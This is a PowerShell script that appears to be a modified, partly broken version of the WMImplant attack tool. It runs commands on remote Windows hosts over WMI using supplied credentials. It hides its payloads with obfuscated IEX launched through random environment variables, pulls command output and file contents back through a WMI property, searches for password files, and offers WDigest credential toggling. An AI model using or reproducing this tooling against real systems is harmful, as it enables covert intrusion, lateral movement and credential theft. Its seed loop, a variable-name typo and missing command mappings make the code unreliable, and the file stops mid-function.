$lines = Get-Content "usersdo.txt"
$seeduser = $false
$seedpassword = $false
$seedtargets = $false

Read-Host 
"ensure system is seeded here is the suggeseted formating
#Account:YO
#Password:PASSWORD
#Target(s):
"
While (!($seeduser -and $seedpassword -and $seedtargets)){
    foreach ($line in $lines) {
        if ($line -contains "Account:") {
            $seeduser = ($line -split ":")[1].Trim()
            Write-Host "Account: $seeduser"
        } elseif ($line -contains "Password:") {
            $seedpass = ($line -split ":")[1].Trim()
            Write-Host "Password: $seedpass"
        } elseif ($line -contains "Target(s):") {
            $targets = ($line -split ":")[1].Trim()
            Write-Host "Targets: $targets"
        }
    if(!($seeduser -and $seedpassword -and $seedtargets)){
         Write-Host "Seed Failed"
    }
    
    }
}
Write-Host "Seed Passed Script is Starting"







function Use-MenuSelection
{
    # This function is where the user provides the command they wish to execute
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential
    )

    $looping = $true
    while ($looping)
    {

        # Read in user's menu choice
        $menu_selection = Read-Host "WMIHell>"
        $menu_selection = $menu_selection.Trim().ToLower()
        <#
                if(($menu_selection -ne 'exit') -and ($menu_selection -ne 'change_user') -and ($menu_selection -ne 'help'))
        {
            $ComputerName = Read-Host "What system are you targeting? >"
            $ComputerName = $ComputerName.Trim()
        }
        
        #>


        switch ($menu_selection)
        {
            "seed"
            {
                $Credential,$ComputerNam = select-seed
                Invoke-CommandGeneration -ComputerName $ComputerName
            }

            "exit"
            {
                $looping = $false
            }

            "command_exec"
            {
                if ($Credential)
                {
                    Invoke-CommandExecution -Credential $Credential -ComputerName $ComputerName
                }

                else
                {
                    Invoke-CommandExecution -ComputerName $ComputerName
                }
            }

            "ifconfig"
            {
                if($Credential)
                {
                    Get-NetworkCards -Credential $Credential -ComputerName $ComputerName
                }

                else
                {
                    Get-NetworkCards -ComputerName $ComputerName
                }
            }

            "logon_events"
            {
                $FileSave = Read-Host "Do you want to save the log information to a file? [yes/no] >"
                $FileSave = $FileSave.Trim().ToLower()

                if(($FileSave -eq "y") -or ($FileSave -eq "yes"))
                {
                    $FileSavePath = Read-Host "What is the full path to where the file should be saved? >"
                    $FileSavePath = $FileSavePath.Trim()

                    if($Credential)
                    {
                        Get-WMIEventLogins -Credential $Credential -FileName $FileSavePath -ComputerName $ComputerName
                    }

                    else
                    {
                        Get-WMIEventLogins -FileName $FileSavePath -ComputerName $ComputerName
                    }
                }

                else
                {
                    if($Credential)
                    {
                        Get-WMIEventLogins -Credential $Credential -ComputerName $ComputerName
                    }

                    else
                    {
                        Get-WMIEventLogins -ComputerName $ComputerName
                    }
                }
            }

            "vacant_system"
            {
                if($Credential)
                {
                    Find-VacantComputer -Credential $Credential -ComputerName $ComputerName
                }
                else
                {
                    Find-VacantComputer -ComputerName $ComputerName
                }
            }

            default
            {
                Write-Output "You did not select a valid command! Please try again!"
            }
        } #End of switch
    } # End of while loop
} 

function select-seed
{
    # Query user for user account and password to use
    $UserUsername = Read-Host "Please provide the domain\username to use for authentication >"
    $UserPassword = Read-Host "Please provide the password to use for authentication >"
    $ComputerName = Read-Host "What system are you targeting? >"
    $ComputerName = $ComputerName.Trim()

    # This block of code is executed when starting a process on a remote machine via wmi
    $ChangedPassword = ConvertTo-SecureString $UserPassword -asplaintext -force 
    $cred = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $UserUsername,$ChangedPassword
    return $cred,$ComputerName
}

function Invoke-CommandExecution
{
                # This function allows you to run a command-line command on the targeted system and
                # receive its output
                param
                (
                    #Parameter assignment
                    [Parameter(Mandatory = $False)]
                    [System.Management.Automation.PSCredential]$Credential,
                    [Parameter(Mandatory = $True)]
                    [string]$ComputerName,
                    [Parameter(Mandatory = $False)]
                    [string]$ExecCommand
                )
            
                Process
                {
                    if(!$ExecCommand)
                    {
                        $ExecCommand = Read-Host "Please provide the command you'd like to run >"
                    }
            
                    # Get original WMI Property
                    if($Credential)
                    {
                        $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Credential).DebugFilePath
                    }
                    else
                    {
                        $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName).DebugFilePath
                    }
            
                    Write-Verbose "Building PowerShell command"
            
                    $remote_command = '$output = '
                    $remote_command += "($ExecCommand | Out-String).Trim();"
                    $remote_command += ' $EncodedText = [Int[]][Char[]]$output -Join '','';'
                    $remote_command += ' $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $EncodedText; $a.Put()'
            
                    Write-Verbose "Running command on remote system..."
            
                    if($Credential)
                    {
                        Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -Credential $Credential -ObfuscateWithEnvVar
                    }
                    else
                    {
                        Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -ObfuscateWithEnvVar
                    }
            
                    # Poll remote system, and determine if the script is done
                    # If not, sleep and poll again
                    $quit = $false
                    while($quit -eq $false)
                    {
                        Write-Verbose "Polling property to see if the script has completed"
                        if($Credential)
                        {
                            $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Credential
                        }
                        else
                        {
                            $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName
                        }
                        
                        try 
                        {
                            if($Original_WMIProperty -match  $modified_WMIObject.DebugFilePath)
                            {
                                Write-Verbose "Script is not done, sleeping for 5 and trying again"
                                Start-Sleep -s 5
                            }
                            else 
                            {
                                Write-Verbose "Script is complete, pulling data now"
                                $quit = $true
                            }
                        }
                        catch
                        {
                            Write-Verbose "Script is not done, sleeping for 5 and trying again"
                            Start-Sleep -s 5
                        }
                    }
                
                    $decode = [char[]][int[]]$modified_WMIObject.DebugFilePath.Split(',') -Join ''
                    # Print to console
                    $decode
            
                    # Replacing WMI Property
                    Write-Verbose "Replacing WMI Property"
            
                    $modified_WMIObject.DebugFilePath = $Original_WMIProperty
                    $null = $modified_WMIObject.Put()
            
                    Write-Verbose "Done!"
                }
}

function Invoke-WMIObfuscatedPSCommand
{
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [String]$PSCommand,
        [Parameter(Mandatory = $True)]
        [String]$ComputerName,
        [Parameter(Mandatory = $False)]
        [Switch]$ObfuscateWithEnvVar
    )

    Process
    {
        # Generate randomized and obfuscated syntax for retrieving PowerShell command from an environment variable if $ObfuscateWithEnvVar flag was defined.
        if($ObfuscateWithEnvVar)
        {
            # Create random alphanumeric environment variable name.
            $VarName = -join (Get-Random -Input ((((65..90) + (97..122) | % {[char]$_})) + (0..9)) -Count 5)

            # Randomly select obfuscated syntax for invoking the contents of the randomly-named environment variable.
            # More complete obfuscation options can be imported from Invoke-Obfuscation.
            $DGGetChildItemSyntaxRandom = Get-Random -Input @('Get-C`hildItem','Child`Item','G`CI','DI`R','L`S')
            $DGGetCommandSyntaxRandom   = Get-Random -Input @('Get-C`ommand','Co`mmand','G`CM')
            $DGInvokeSyntaxRandom       = Get-Random -Input @('IE`X','Inv`oke-Ex`pression',".($DGGetCommandSyntaxRandom ('{1}e{0}'-f'x','i'))")
        
            $DGEnvVarSyntax       = @()
            $DGEnvVarSyntax      += "(" + $DGGetChildItemSyntaxRandom + " env:$VarName).Value"
            $DGEnvVarSyntax      += "`$env:$VarName"
            $DGEnvVarSyntaxRandom = (Get-Random -Input $DGEnvVarSyntax)

            $DGInvokeEnvVarSyntax       = @()
            $DGInvokeEnvVarSyntax      += $DGInvokeSyntaxRandom + ' ' + $DGEnvVarSyntaxRandom
            $DGInvokeEnvVarSyntax      += $DGEnvVarSyntaxRandom + '|' + $DGInvokeSyntaxRandom
            $DGInvokeEnvVarSyntaxRandom = (Get-Random -Input $DGInvokeEnvVarSyntax)

            $PSCommandForCommandLine = $DGInvokeEnvVarSyntaxRandom
        }
        else
        {
            $PSCommandForCommandLine = $PSCommand
        }

        # Set final PowerShell command to be executed by WMI.
        $ObfuscatedCommand = "powershell $PSCommandForCommandLine"

        # Extract username if $Credential were specified. Otherwise use current username.
        if($Credential)
        {
            $Username = $Credential.UserName
        }
        else
        {
            $Username = $env:USERNAME
        }

        # Set PowerShell command in an environment variable if $ObfuscateWithEnvVar flag was defined.
        if($ObfuscateWithEnvVar)
        {
            if($Credential)
            {
                $null = Set-WmiInstance -Class Win32_Environment -Argument @{Name=$VarName;VariableValue=$PSCommand;UserName=$Username} -ComputerName $ComputerName -Credential $Credential
            }
            else
            {
                $null = Set-WmiInstance -Class Win32_Environment -Argument @{Name=$VarName;VariableValue=$PSCommand;UserName=$Username} -ComputerName $ComputerName
            }
        }

        # Launch PowerShell command.
        if($Credential)
        {
            $null = Invoke-WmiMethod -Class Win32_Process -EnableAllPrivileges -Impersonation 3 -Authentication Packetprivacy -Name Create -Argumentlist $ObfuscatedCommand -Credential $Credential -ComputerName $ComputerName
        }
        else
        {
            $null = Invoke-WmiMethod -Class Win32_Process -EnableAllPrivileges -Impersonation 3 -Authentication Packetprivacy -Name Create -Argumentlist $ObfuscatedCommand -ComputerName $ComputerName
        }

        # Delete environment variable containing PowerShell command if $ObfuscateWithEnvVar flag was defined.
        if($ObfuscateWithEnvVar)
        {
            if($Credential)
            {
                $null = Get-WmiObject -Query "SELECT * FROM Win32_Environment WHERE NAME='$VarName'" -ComputerName $ComputerName -Credential $Credential | Remove-WmiObject
            }
            else
            {
                $null = Get-WmiObject -Query "SELECT * FROM Win32_Environment WHERE NAME='$VarName'" -ComputerName $ComputerName | Remove-WmiObject
            }
        }

        <#DELETE BELOW BLOCK FOR FINAL RELEASE#>
        $ShowFunFactsForPOV = $False
        if($ShowFunFactsForPOV -AND $ObfuscateWithEnvVar)
        {
            Write-Host "`n`nHere's what just happened:" -ForegroundColor White
            Write-Host "Random env var NAME :: " -NoNewLine -ForegroundColor White
            Write-Host $VarName -ForegroundColor Cyan
            Write-Host "Env var VALUE       :: " -NoNewLine -ForegroundColor White
            Write-Host $PSCommand -ForegroundColor Cyan
            Write-Host "PS cmdline launcher :: " -NoNewLine -ForegroundColor White
            Write-Host $ObfuscatedCommand -ForegroundColor Green
        }
        <#DELETE ABOVE BLOCK FOR FINAL RELEASE#>

    } # End of Process Block
    end{}
} # End of Function block

function Get-HostInfo
{
    # This function attempts to gather basic information about the targeted system
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [string]$ComputerName
    )

    Process
    {
        try
        {
            $sys_info = Get-WmiObject -class win32_computersystem @PSBoundParameters -ErrorAction Stop
        }
        catch
        {
            Continue
        }

        if($sys_info.Name)
        {
            $sys_info
        }
    }
    end{}
}

function Invoke-CommandGeneration
{
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $True)]
        [string]$ComputerName
    )

    # This function generates the command line command users would run to invoke WMImplant
    # in a non-interactive manner
    Show-WMImplantMainMenu

    # Read in user's menu choice
    $GenSelection = Read-Host "What is the command you'd like to run? >"
    $GenSelection = $GenSelection.Trim().ToLower()

    $AnyCreds = Read-Host "Do you want to run this in the context of a different user? [yes] or [no]? >"
    $AnyCreds = $AnyCreds.Trim().ToLower()

    if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
    {
        # Query user for user account and password to use
        $GenUsername = Read-Host "Please provide the domain\username to use for authentication >"
        $GenPassword = Read-Host "Please provide the password to use for authentication >"
    }

    # hashmap for command generation
    $wmimplant_commands = @{"seed" = "`nInvoke-WMImplant -SetWMIDefault";
                            "logon_events" = "`nInvoke-WMImplant -LogonEvents";
                            }

    switch ($GenSelection)
    {
        "change_user"
        {
            Throw "This really isn't applicable unless you are using WMImplant interactively."
        }

        "exit"
        {
            Throw "This command isn't applicable unless using WMImplant interactively"
        }

        "gen_cli"
        {
            Throw "You are already generating a command!"
        }

        "set_default"
        {
            $Command = $wmimplant_commands.Get_Item("set_default")
        }

        "command_exec"
        {
            $GenCommandExec = Read-Host "What command do you want to run on the remote system? >"
            $Command = $wmimplant_commands.Get_Item("command_exec")
            $Command += "`"$GenCommandExec`""
        }

        "logon_events"
        {
            $GenSaveFile = Read-Host "Do you want to save the log output to a file? [yes/no] >"
            $GenSaveFile = $GenSaveFile.Trim().ToLower()
            $Command = $wmimplant_commands.Get_Item("logon_events")

            if($GenSaveFile -eq "yes")
            {
                $GenFileSave = Read-Host "What's the full path to where you'd like the output saved? >"
                $GenFileSave = $GenFileSave.Trim()
                $Command += " -LocalFile $GenFileSave"
            }
        }

        "vacant_system"
        {
            $Command = $wmimplant_commands.Get_Item("vacant_system")
        }

        default
        {
            Write-Output "You did not select a valid command!  Please try again!"
        }
    } #End of switch

    if($Command -ne '')
    {
        if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
        {
            $Command += " -RemoteUser $GenUsername -RemotePass $GenPassword`n"
        }

        # See if user is reading in computers from a file
        $FileInput = Read-Host "Do you want to run a WMImplant against a list of computers from a file? [yes] or [no] >"
        $FileInput = $FileInput.Trim().ToLower()
        if(($FileInput -ceq 'y') -or ($FileInput -ceq 'yes'))
        {
            $ComputerPath = Read-Host "What is the full path to the file containing a list of computers? >"
            $Command = $Command.Trim()
            $Command = "Get-Content $ComputerPath | $Command"
        }
        else
        {
            $Command += " -ComputerName $ComputerName"
        }

        # Print command
        $Command
    }
    
} 

function Invoke-RemoteScriptWithOutput
{
    # This function will start a new PowerShell process on the targeted system, IEX load a user specified script,
    # run the user specified function, store the output, and retrieve the output
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [string]$ComputerName,
        [Parameter(Mandatory = $False)] 
        [string]$Location,
        [Parameter(Mandatory = $False)] 
        [string]$Function
    )

    Process
    {
        if(!$Location)
        {
            $Location = Read-Host "Please provide the full path to the local PowerShell script you'd like to run on the target >"
            $Location = $Location.Trim()
        }

        if(!$Function)
        {
            $Function = Read-Host "Please provide the PowerShell function you'd like to run >"
            $Function = $Function.Trim()
        }

        # Saving original WMI Property value
        if($Credential)
        {
            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Credential).DebugFilePath
        }
        else
        {
            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName).DebugFilePath
        }

        # Read in and store the script to run
        $script_to_run = Get-Content -Encoding byte -Path $Location
        $encoded_script = [Int[]][Char[]]$script_to_run -Join ','

        if($Credential)
        {
            $modify_wmi_prop = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Credential
        }
        else
        {
            $modify_wmi_prop = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName
        }
        $modify_wmi_prop.DebugFilePath = $encoded_script
        $null = $modify_wmi_prop.Put()

        Write-Verbose "Building PowerShell command"
        # Separating the commands out to make it a little easier to view/understand what is happening
        $remote_command = '$a = Get-WMIObject -Class Win32_OSRecoveryConfiguration; $a = [char[]][int[]]$a.DebugFilePath.Split('','') -Join ''''; $a | .(-Join[char[]]@(105,101,120));'
        $remote_command += '$output = '
        $remote_command += "($Function | Out-String).Trim();"
        $remote_command += ' $EncodedText = [Int[]][Char[]]$output -Join '','';'
        $remote_command += ' $a = Get-WMIObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $EncodedText; $a.Put()'

        Write-Verbose "Running command on remote system..."

        if($Credential)
        {
            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -Credential $Credential -ObfuscateWithEnvVar
        }
        else
        {
            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -ObfuscateWithEnvVar
        }

        # Poll remote system, and determine if the script is done
        # If not, sleep and poll again
        $quit = $false
        while($quit -eq $false)
        {
            Write-Verbose "Polling property to see if the script has completed"
            if($Credential)
            {
                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Credential
            }
            else
            {
                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName
            }
            
            try 
            {
                if($encoded_script -eq $modified_WMIObject.DebugFilePath)
                {
                    Write-Verbose "Script is not done, sleeping for 5 and trying again"
                    Start-Sleep -s 5
                }
                else
                {
                    Write-Verbose "Script is complete, pulling data now"
                    $quit = $true
                }
            }
            catch
            {
                Write-Verbose "Script is not done, sleeping for 5 and trying again"
                Start-Sleep -s 5
            }
        }
    
        $decode = [char[]][int[]]$modified_WMIObject.DebugFilePath.Split(',') -Join ''
        # Print to console
        $decode

        # Replacing original WMI property value from remote system
        Write-Verbose "Replacing original WMI property value from remote system"
        $modified_WMIObject.DebugFilePath = $Original_WMIProperty
        $null = $modified_WMIObject.Put()

        Write-Verbose "Done!"
    }
}



function Invoke-WMImplant
{
    <#
    .SYNOPSIS
    This function starts all of WMImplant and is designed to display the main menu.

    .DESCRIPTION
    This is the main WMImplant function.  When calling Invoke-WMImplant you will be presented with the main menu.

    .DESCRIPTION
    This parameter is used to start WMImplant in an interactive manner. This is done by default, unless specifying a command

    .PARAMETER RemoteUser
    Specify a username. Default is the current user context.  This user is used to connect to remote systems.

    .PARAMETER RemotePass
    Specify the password for the appropriate user. This is the password for the account used to connect to remote systems.

    .PARAMETER ListCommands
    List the available commands within WMImplant.

    .PARAMETER LocalFile
    This parameter is used when user's need to provide the path to a file locally for interaction (uploading a local file or providing a path to download a file to locally), or when saving event log information locally.

    .PARAMETER RemoteFile
    This parameter is used when user's need to provide the path to a file remotely for interaction (downloading a remote file or providing a path to upload a file to) or when needing to specify a directory (such as a directory where you want to list all its contents).
    
    .PARAMETER RemoteDirectory
    This parameter is used when specifying a directory for listing its contents

    .PARAMETER RemoteCommand
    This parameter is used to specify a command to run on a remote system.

    .PARAMETER ComputerName
    This parameter specifies the system to execute the WMImplant command on.

    .PARAMETER Function
    This parameter specifies the function to run when remotely running PowerShell

    .PARAMETER CommandExec
    This parameter specifies that WMImplant will run a command and return the output.

    .PARAMETER DisableWDigest
    This parameter specifies that WMImplant will remove the UseLogonCredential registry key from the targeted system.

    .PARAMETER DisableWinRM
    This parameter will have WMImplant attempt to force disable WinRM on the targeted system.

    .PARAMETER EnableWdigest
    This parameter will have WMImplant set the UseLogonCredential registry key on the targeted system

    .PARAMETER EnableWinRM
    This parameter will have WMImplant attempt to force enable WinRM on the targeted system.

    .PARAMETER RemotePosh
    This parameter will tell WMImplant to run a PowerShell command on the targeted system

    .PARAMETER SetWMIDefault
    This parameter sets the DebugFilePath property back to the default MS value.
    #>

    [CmdletBinding(DefaultParameterSetName="Interactive")]

    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False, ParameterSetName='Interactive')]
        [switch]$Interactive,

        [Parameter(Mandatory = $False, ParameterSetName='List Commands')]
        [switch]$ListCommands,
        
        [Parameter(Mandatory = $False)]
        [string]$RemoteUser,

        [Parameter(Mandatory = $False)]
        [string]$RemotePass,

        [Parameter(Mandatory = $False)]
        [string]$RemoteFile,

        [Parameter(Mandatory = $False, ValueFromPipeLine=$True)]
        [Alias("Target")]
        [string]$ComputerName,

        [Parameter(Mandatory = $False, ParameterSetName='Command Execution')] 
        [string]$RemoteCommand,

        [Parameter(Mandatory = $False, ParameterSetName='Upload File')]
        [switch]$Upload,

        [Parameter(Mandatory = $False, ParameterSetName='Command Execution')]
        [switch]$CommandExec,

        [Parameter(Mandatory = $False, ParameterSetName='Set Default WMI Property')]
        [switch]$SetWMIDefault,

        [Parameter(Mandatory = $False, ParameterSetName='Active NIC Listing')]
        [switch]$IFConfig,

        [Parameter(Mandatory = $False, ParameterSetName='Logon Events')]
        [switch]$LogonEvents,

        [Parameter(Mandatory = $False, ParameterSetName='Remote PowerShell')]
        [string]$Location
    )

    Process
    {
        # Create the remote credential object that will be needed for EVERYTHING
        if($RemoteUser -and $RemotePass)
        {
            $RemotePassword = ConvertTo-SecureString $RemotePass -asplaintext -force 
            $RemoteCredential = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $RemoteUser,$RemotePassword
        }

        if((!$ComputerName) -and ($PSCmdlet.ParameterSetName -ne 'Interactive'))
        {
            Throw "You need to specify a target to run the command against!"
        }

        elseif($CommandExec)
        {
            if(!$RemoteCommand)
            {
                Throw "You need to specify the command to run with the -Command!"
            }

            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Invoke-CommandExecution -Credential $RemoteCredential -ExecCommand $RemoteCommand -ComputerName $Computer
                }

                else
                {
                    Invoke-CommandExecution -ComputerName $Computer -ExecCommand $RemoteCommand
                }
            }
        }

        elseif($ListCommands)
        {
            Show-WMImplantMainMenu
        }

        elseif($Interactive)
        {
            Show-WMImplantMainMenu
            Use-MenuSelection
        }

        # I don't believe this should ever execute
        else
        {
            Show-WMImplantMainMenu
            Use-MenuSelection
        }
    }
}



function Show-WMImplantMainMenu
{
    # Print out commands available to the user
    $menu_options = "`nWMImplant Main Menu:`n`n"

    $menu_options += "Meta Functions:`n"
    $menu_options += "====================================================================`n"
    $menu_options += "change_user - Change the user used to connect to remote systems`n"
    $menu_options += "exit - Exit WMImplant`n"
    $menu_options += "gen_cli - Generate the CLI command to execute a command via WMImplant`n"
    $menu_options += "set_default - Set default value of DebugFilePath property`n"
    $menu_options += "help - Display this help/command menu`n`n"

    $menu_options += "File Operations`n"
    $menu_options += "====================================================================`n"
    $menu_options += "cat - Attempt to read a file's contents`n"
    $menu_options += "copy - Copy a file from one location to another`n"
    $menu_options += "delete - delete a file from the targeted system`n"
    $menu_options += "download - Download a file from a remote machine`n"
    $menu_options += "ls - File/Directory listing of a specific directory`n"
    $menu_options += "search - Search for a file on a user-specified drive`n"
    $menu_options += "upload - Upload a file to a remote machine`n`n"

    $menu_options += "Lateral Movement Facilitation`n"
    $menu_options += "====================================================================`n"
    $menu_options += "command_exec - Run a command line command and get the output`n"
    $menu_options += "disable_wdigest - Remove registry value UseLogonCredential`n"
    $menu_options += "disable_winrm - Disable WinRM on the targeted host`n"
    $menu_options += "enable_wdigest - Add registry value UseLogonCredential`n"
    $menu_options += "enable_winrm - Enable WinRM on a targeted host`n"
    $menu_options += "registry_mod - Modify the registry on the targeted system`n"
    $menu_options += "remote_posh - Run a PowerShell script on a system and receive output`n"
    $menu_options += "service_mod - Create, delete, or modify services`n`n"

    $menu_options += "Process Operations`n"
    $menu_options += "====================================================================`n"
    $menu_options += "process_kill - Kill a specific process`n"
    $menu_options += "process_start - Start a process on a remote machine`n"
    $menu_options += "ps - Process listing`n`n"
    
    $menu_options += "System Operations`n"
    $menu_options += "====================================================================`n"
    $menu_options += "active_users - List domain users with active processes on a system`n"
    $menu_options += "basic_info - Gather hostname and other basic system info`n"
    $menu_options += "drive_list - List local and network drives`n"
    $menu_options += "ifconfig - IP information for NICs with IP addresses`n"
    $menu_options += "installed_programs - Receive a list of all programs installed`n"
    $menu_options += "logoff - Logs users off the specified system`n"
    $menu_options += "reboot - Reboot a system`n"
    $menu_options += "power_off - Power off a system`n"
    $menu_options += "vacant_system - Determine if a user is away from the system.`n`n"

    $menu_options += "Log Operations`n"
    $menu_options += "====================================================================`n"
    $menu_options += "logon_events - Identify users that have logged into a system`n`n"

    # Print the menu out to the user
    $menu_options
}

# End of function

function Find-FileWMImplant
{
    # This function enables a user to search for a file name or extension on the
    # targeted computer
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [string]$ComputerName,
        [Parameter(Mandatory = $False)]
        [string]$File,
        [Parameter(Mandatory = $False)]
        [string]$Drive,
        [Parameter(Mandatory = $False, ParameterSetName='extension')] 
        [string]$Extension
    )

    process
    {
        if(!$Drive)
        {
            $Drive = Read-Host "What drive do you want to search? (Ex: C:) >"
            $Drive = $Drive.Trim()
        }

        # Check length of drive, only want first two characters
        if($Drive.length -gt 2)
        {
            $Drive = $Drive.substring(0,2)
        }

        elseif($Drive.length -lt 2)
        {
            Throw "Drive needs two character EX: C:"
        }

        if(!$File -and !$Extension)
        {
            $Search_Target = Read-Host "Do you want to search for a [file] or file [extension]? >"
            $Search_Target = $Search_Target.Trim().ToLower()

            if($Search_Target -eq "file")
            {
                $File = Read-Host "What file do you want to search for? (Ex: pass.txt or *ssword.txt) >"
                $File = $File.Trim().ToLower()
            }
            elseif($Search_Target -eq "extension")
            {
                $Extension = Read-Host "What file extension do you want to search for? (Ex: sql) >"
                $Extension = $Extension.Trim().ToLower()
            }
            else
            {
                Throw "You need to search for either a file or file extension!"
            }
        }

        # If searching for a file and not a file extension
        if($File)
        {
            $counter = 0
            $filter = "Filename"
            foreach($incoming_file in $File)
            {
                if($counter -gt 0)
                {
                    $filter += "OR Filename"
                }

                if($incoming_file.Contains("."))
                {
                    #get the index of the last .
                    $index = $incoming_file.LastIndexOf(".")
                    #get the first part of the name
                    $filename = $incoming_file.Substring(0,$index)
                    #get the last part of the name
                    $extension = $incoming_file.Substring($index+1)

                    if($filename -match "\*")
                    {
                        $filename = $filename.Replace("*","%")
                        $filter += " LIKE '$filename' "
                    }
                    else
                    {
                        $filter += " = '$filename' "
                    }

                    if ($extension -match "\*")
                    {
                        $extension = $extension.Replace("*","%")
                        $filter += "AND Extension LIKE '$extension' "
                    }
                    else 
                    {
                        $filter += "AND Extension = '$extension' "
                    }
                    
                }
                else
                {
                    if($incoming_file -match "\*")
                    {
                        $filename = $incoming_file.Replace("*","%")
                        $filter += " LIKE '$filename' "
                    }
                    else
                    {
                        $filter += " = '$incoming_file' "
                    }
                }
                $counter += 1
            }
        }

        # If searching by extension
        elseif($Extension)
        {
            $counter = 0
            $filter = "Extension"
            foreach($ext in $Extension)
            {
                if($counter -gt 0)
                {
                    $filter += "OR Extension"
                }

                if ($ext -match "\*")
                {
                    $ext = $ext.Replace("*","%")
                    $filter += " LIKE '$ext' "
                }
                else 
                {
                    $filter += " = '$ext' "
                }
                $counter += 1
            }
        }

        $filter += "AND Drive='$Drive'"

        if($Credential)
        {
            Get-WmiObject -Class cim_datafile -filter $filter -ComputerName $ComputerName -Credential $Credential
        }
        else
        {
            Get-WmiObject -Class cim_datafile -filter $filter -ComputerName $ComputerName
        }
    }
}

function Get-FileContentsWMImplant
{
    # This function reads and displays the contents of a user-specified file on the targeted machine to the console
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [string]$ComputerName,
        [Parameter(Mandatory = $False)]
        [string]$File
    )

    Process
    {
        if(!$File)
        {
            $File = Read-Host "What's the full path to the file you'd like to view? >"
            $File = $File.Trim()
        }

        # Keep original WMI Property Value
        if($Credential)
        {
            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Credential).DebugFilePath
        }
        else
        {
            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName).DebugFilePath
        }

        # On remote system, save file to registry
        Write-Verbose "Reading remote file and writing to WMI property"
        $remote_command = '$fct = Get-Content -Encoding byte -Path ''' + "$File" + '''; $fctenc = [Int[]][Char[]]$fct -Join '',''; $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $fctenc; $a.Put()'

        if($Credential)
        {
            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -Credential $Credential -ObfuscateWithEnvVar
        }
        else
        {
            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -ObfuscateWithEnvVar
        }

        # Poll remote system, and determine if the script is done
        # If not, sleep and poll again
        $quit = $false
        while($quit -eq $false)
        {
            Write-Verbose "Polling property to see if the script has completed"
            if($Credential)
            {
                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Credential
            }
            else
            {
                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName
            }
            
            try 
            {
                if($Original_WMIProperty -match  $modified_WMIObject.DebugFilePath)
                {
                    Write-Verbose "Script is not done, sleeping for 5 and trying again"
                    Start-Sleep -s 5
                }
                else 
                {
                    Write-Verbose "Script is complete, pulling data now"
                    $quit = $true
                }
            }
            catch
            {
                Write-Verbose "Script is not done, sleeping for 5 and trying again"
                Start-Sleep -s 5
            }
        }
    
        $decode = [char[]][int[]]$modified_WMIObject.DebugFilePath.Split(',') -Join ''
        # Print to console
        $decode

        # Removing Registry value from remote system
        Write-Verbose "Replacing property on remote system"

        $modified_WMIObject.DebugFilePath = $Original_WMIProperty
        $null = $modified_WMIObject.Put()

        Write-Verbose "Done!"
    }
    end{}
}

function Invoke-FileTransferWMImplant
{
    # This function enables the user to upload or download files to/from the attacking machine to/from the targeted machine
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [string]$ComputerName,
        [Parameter(Mandatory = $False,ParameterSetName='download')]
        [switch]$Download,
        [Parameter(Mandatory = $False,ParameterSetName='upload')]
        [switch]$Upload,
        [Parameter(Mandatory = $False)]
        [string]$DownloadFile,
        [Parameter(Mandatory = $False)]
        [string]$DownloadFilePath,
        [Parameter(Mandatory = $False)]
        [string]$UploadFile,
        [Parameter(Mandatory = $False)]
        [string]$UploadFilePath
    )

    Process
    {
        # invoke powershell on both remote and local system.  Both will connect back over WMI to retrieve file contents
        # applies to both download and upload operations.
        # Uses HKLM/Software/Microsoft
